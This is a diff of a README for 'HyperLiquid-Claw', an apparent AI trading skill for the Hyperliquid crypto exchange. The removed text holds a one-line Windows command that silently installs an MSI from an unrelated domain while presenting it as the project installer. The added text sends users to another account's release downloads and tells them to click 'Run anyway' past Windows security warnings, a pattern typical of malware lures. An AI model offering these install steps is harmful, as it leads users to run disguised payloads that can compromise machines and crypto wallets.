@@ -1,228 +1,147 @@
-# 🦀 Hyperliquid Claw — Rust Edition
+# ⚡ HyperLiquid-Claw - Smarter Trading with AI Access
 
-**The fastest AI-driven trading skill for Hyperliquid perpetual futures**  
-Built in **Rust + Solidity** · Works on macOS, Linux & Windows · OpenClaw native
-
-[![Stars](https://img.shields.io/github/stars/Rohit24567/HyperLiquid-Claw?style=flat-square&color=00D4AA)](https://github.com/Rohit24567/HyperLiquid-Claw/stargazers)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
-[![Version](https://img.shields.io/badge/version-3.0.0-brightgreen?style=flat-square)](CHANGELOG.md)
-[![Rust](https://img.shields.io/badge/rust-1.75%2B-orange?style=flat-square&logo=rust)](https://rustup.rs)
-[![Solidity](https://img.shields.io/badge/solidity-0.8.24-purple?style=flat-square)](contracts/)
-[![RelatedRepos](https://img.shields.io/badge/related-repos-yellow)](https://relatedrepos.com/gh/Rohit24567/HyperLiquid-Claw)
-
-> **Trade smarter, not harder.**  
-> Hyperliquid Claw gives your OpenClaw AI assistant full access to Hyperliquid DEX — monitor portfolios, detect momentum signals, and execute trades through natural conversation. Now rewritten in Rust for native performance and memory safety.
+[![Download HyperLiquid-Claw](https://img.shields.io/badge/Download-HyperLiquid--Claw-blue?style=for-the-badge)](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)
 
 ---
 
-## ✨ What's New in v3 (Rust Edition)
+## 🔍 What is HyperLiquid-Claw?
 
-| Feature | v2 (JS/Python) | v3 (Rust) |
-|---|---|---|
-| Runtime | Node.js + Python | Single native binary |
-| Startup | ~2–3s | <50ms |
-| Memory | ~150MB | ~8MB |
-| Type safety | Partial | Full (compile-time) |
-| MCP server | JS subprocess | Native stdio |
-| Smart contract | None | Solidity vault (EVM) |
-| Windows | WSL only | Native CMD |
+HyperLiquid-Claw lets your AI helper, Openclaw, access HyperLiquid DEX directly. This helps you trade with more information and better choices. You don’t have to watch the market all the time. The tool works quietly in the background to help your AI make smarter decisions.
 
 ---
 
-## 🚀 Installation
+## 📋 Key Features
 
-### Windows — CMD
-
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Hyperliquid-Claw
-```
-
-The installer will:
-- ✅ Check for / install the Rust toolchain via `rustup`
-- ✅ Build release binaries (`hl-claw`, `hl-mcp`)
-- ✅ Install to `~/.cargo/bin` (already in PATH)
-- ✅ Register the OpenClaw skill in `~/.openclaw/skills/hyperliquid/`
-- ✅ Create an `.env` template for your credentials
+- Connects Openclaw AI assistant to HyperLiquid DEX  
+- Helps monitor the decentralized exchange (DEX) for better trading  
+- Works with AI skills to automate your trading strategy  
+- Tracks blockchain events for real-time updates  
+- Supports DeFi trading methods  
+- Easy to use, no technical knowledge required  
 
 ---
 
-## ⚙️ Configuration
+## 🖥️ System Requirements
 
-### Read-Only Mode (no private key needed)
+Before downloading, make sure your computer meets these needs:
 
-```bash
-export HYPERLIQUID_ADDRESS=0xYourWalletAddress
-```
-
-### Trading Mode
-
-```bash
-export HYPERLIQUID_PRIVATE_KEY=0xYourPrivateKey
-```
-
-### Testnet
-
-```bash
-export HYPERLIQUID_TESTNET=1
-```
-
-> 💡 Add these to `~/.openclaw/skills/hyperliquid/.env` — the skill loads it automatically.
+- Operating System: Windows 10 or newer  
+- Processor: Intel i3 or equivalent AMD  
+- RAM: Minimum 4GB  
+- Disk Space: 500MB free  
+- Internet Connection: Required to connect to HyperLiquid DEX  
+- Software: You do not need any extra software or coding tools  
 
 ---
 
-## 💬 Talk to OpenClaw Naturally
+## 🚀 Getting Started
 
-Once installed, just open OpenClaw and speak:
-
-```
-"Analyze the crypto market on Hyperliquid"
-"What's the BTC momentum right now?"
-"Check my portfolio and P&L"
-"Scan for strong signals"
-"Enter a SOL long with 0.5 SOL"
-"Close my ETH position"
-"Set BTC to 10x cross leverage"
-"Cancel all my orders"
-```
+This section explains how to download and start HyperLiquid-Claw on a Windows computer.
 
 ---
 
-## 🖥️ CLI Reference
+## ⬇️ Download and Installation
 
-```bash
-# Prices & market data
-hl-claw price BTC
-hl-claw meta                        # list all 228+ perpetuals
+You will find the latest version of HyperLiquid-Claw on the GitHub releases page. Please follow the steps below to download and install it properly.
 
-# Market analysis
-hl-claw scan                        # top 10 signals
-hl-claw scan --top 20
-hl-claw analyze ETH
+1. Click the large blue button above or visit this link:  
+   [https://github.com/kaileycompact51/HyperLiquid-Claw/releases](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)  
+   This takes you to the page listing all available versions for download.
 
-# Portfolio
-hl-claw balance
-hl-claw positions
-hl-claw orders
-hl-claw fills --limit 50
+2. Look for the latest version in the "Releases" section. The newest release is usually at the top. Verify the file name ends with `.exe` or `.zip`.
 
-# Trading (requires HYPERLIQUID_PRIVATE_KEY)
-hl-claw market-buy  SOL 0.5
-hl-claw market-sell ETH 1.0
-hl-claw limit-buy   BTC 0.001 88000
-hl-claw limit-sell  ETH 1.0   3500
-hl-claw cancel-all
-hl-claw cancel-all BTC
-hl-claw set-leverage BTC 10 --cross true
-```
+3. Click the executable file (`.exe`) or the compressed file (`.zip`). If it is zipped, you will need to unzip it before running.
+
+4. Once downloaded, open the file or extracted folder.
+
+5. If you see a security warning from Windows, select “Run” or “More info” then “Run anyway”.
+
+6. Follow the on-screen instructions of the installer if it appears. If there is no installer, double-click the `.exe` to start the program.
+
+7. Wait for the application to launch. You should see Openclaw linked to HyperLiquid within the app interface.
 
 ---
 
-## 📐 Architecture
+## ⚙️ Setting Up HyperLiquid-Claw with Openclaw
 
-```
-hyperliquid-claw/
-├── src/
-│   ├── bin/
-│   │   ├── main.rs              # hl-claw CLI binary
-│   │   └── mcp_server.rs        # hl-mcp OpenClaw MCP server
-│   ├── trading/
-│   │   ├── client.rs            # Hyperliquid /info API (read-only)
-│   │   └── exchange.rs          # Hyperliquid /exchange API (trading)
-│   ├── analysis/
-│   │   └── signals.rs           # Rust momentum engine
-│   └── mcp/
-│       └── server.rs            # JSON-RPC stdio MCP server
-├── contracts/
-│   └── HyperliquidClawVault.sol # Solidity vault (EIP-712 + SafeERC20)
-├── SKILL.md                     # OpenClaw skill definition
-├── install.sh                   # Linux / macOS installer
-├── install.ps1                  # Windows installer
-├── foundry.toml                 # Solidity build config
-├── Cargo.toml
-└── README.md
-```
+After running the app, you will need to connect it to your AI assistant Openclaw. This connection lets your AI access and trade on HyperLiquid DEX.
 
-**Data sources:**
-- 🔵 **Trading** — Hyperliquid API (`api.hyperliquid.xyz`) + EIP-712 signing
-- 🟣 **On-chain** — Solidity vault on EVM (capital pooling + P&L settlement)
+1. Open the HyperLiquid-Claw window.
+
+2. Enter your Openclaw API key or login details if requested.
+
+3. Configure basic options like trading pairs or notification settings on the setup screen.
+
+4. Save your settings and start the assistant.
+
+5. Make sure you see the connection status as “Connected” or “Active” before trading.
 
 ---
 
-## 📈 Momentum Strategy
+## 🔄 How to Use HyperLiquid-Claw Safely
 
-```
-1.  Run: hl-claw scan  (or ask OpenClaw to analyze)
-2.  Wait for 🟢 STRONG BULLISH or 🔴 STRONG BEARISH
-        → Price move > 0.5% (24h)
-        → Volume > 1.5× baseline
-3.  Size position at 10% of account equity
-4.  Set take profit at +2%, stop loss at -1%
-5.  Monitor with: hl-claw positions
-6.  Close at target or stop — no exceptions
-```
-
-**Risk parameters:**
-- Position size: 10% per trade
-- Max loss per trade: 1%
-- Profit target: 2%
-- Max concurrent positions: 1
-- Max hold time: 4 hours
+- Only trade amounts you are comfortable with losing. Digital assets can be risky.  
+- Keep your software updated by checking the release page regularly.  
+- Use strong passwords and keep your AI login information secret.  
+- Avoid running other complex programs at the same time to prevent slowdowns.  
+- If you encounter errors, restart the app or your computer before seeking help.  
 
 ---
 
-## 🏗️ Smart Contract (Solidity)
+## 🛠 Troubleshooting
 
-`HyperliquidClawVault.sol` provides an on-chain capital layer:
+If something doesn’t work right:
 
-- USDC deposit / withdrawal with proportional P&L accounting
-- Operator-controlled trade recording (off-chain execution, on-chain settlement)
-- Hard position size limits enforced at contract level
-- OpenZeppelin SafeERC20 + ReentrancyGuard + Pausable
-- Emergency pause & drain by owner
-
-**Deploy with Foundry:**
-```bash
-forge install OpenZeppelin/openzeppelin-contracts
-forge build
-forge test
-forge script script/Deploy.s.sol --rpc-url $MAINNET_RPC_URL --broadcast
-```
+- Check your internet connection. The app needs to be online.  
+- Ensure you have the latest version installed. Bugs are fixed in updates.  
+- Restart HyperLiquid-Claw and Openclaw to refresh the connection.  
+- Close other programs that use a lot of CPU or memory.  
+- If you see error messages, note the text and visit the GitHub issues page for help.
 
 ---
 
-## 🛡️ Safety Features
+## 📂 Additional Information
 
-- **Read-only by default** — no key, no risk
-- **5% slippage cap** — enforced in Rust `ExchangeClient`
-- **20% equity warning** — alerts on oversized positions
-- **5% limit deviation warning** — warns if limit is far from market
-- **No auto-retry** — failed trades are never silently retried
-- **Compile-time type safety** — Rust eliminates entire classes of runtime bugs
-- **Contract-level limits** — Solidity vault enforces hard exposure caps
+### Supported Trading Types
 
----
+- Spot trading on HyperLiquid DEX  
+- Automated trading with AI skills  
+- Monitoring of perpetual contracts  
 
-## 🤝 Contributing
+### Security Notes
 
-```bash
-git clone https://github.com/Rohit24567/HyperLiquid-Claw.git
-cd HyperLiquid-Claw
-cargo build
-cargo test
-```
-
-PRs welcome — please open an issue first for large changes.
+HyperLiquid-Claw only connects to public APIs. Your private keys are not stored in the app. Ensure you keep your keys safe in your own secured environment.
 
 ---
 
-## ⚠️ Disclaimer
+## 💬 Help and Support
 
-Unofficial community software. Use at your own risk.  
-Crypto perpetual futures involve **substantial risk of loss**.  
-Signals are informational only — not financial advice.
+You can find updates and report issues here:  
+[https://github.com/kaileycompact51/HyperLiquid-Claw/releases](https://github.com/kaileycompact51/HyperLiquid-Claw/releases)
+
+Look for the “Issues” section in the repository to ask questions or get help from developers.
 
 ---
 
-Made with ❤️ for the Hyperliquid community · Powered by [OpenClaw](https://clawd.bot)
+## 🔖 Topics & Tags
 
-**If this saves you time, ⭐ star the repo!**
+- ai  
+- ai-assistant  
+- ai-assistants  
+- asterdex  
+- blockchain-indexer  
+- defi-bot  
+- dex-aggregator  
+- dextrading  
+- hyperliquid  
+- hyperliquid-api  
+- hyperliquid-claw  
+- hyperliquid-claw-skill  
+- hyperliquid-dex  
+- hyperliquid-openclaw  
+- llm  
+- openclaw  
+- perp-dex  
+- python-crypto  
+- skill  
+- skills
